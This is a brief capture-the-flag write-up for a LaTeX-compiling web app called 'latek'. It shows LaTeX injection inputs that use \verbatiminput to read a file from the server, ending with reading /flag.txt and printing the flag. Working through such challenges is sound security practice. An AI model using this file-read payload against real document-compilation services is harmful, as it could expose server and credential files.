# latek

> bryanguo (not associated with the ctf), keeps saying it's pronouced latek not latex like the glove material. anyways i made this simple app so he stops paying for overleaf.
> https://latek.amt.rs

There is this: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection (beeg boy found this)

So we can read files in LaTeX:
```tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{flag.txt}
\end{document}
```

Which gives us this:

```
foo 1
foo 2
\textbf{foo 3}
```

Like what????

Anyways one day I added a `/` in front of the `flag.txt`:
```tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/flag.txt}
\end{document}
```

And I got the flag: `amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}`
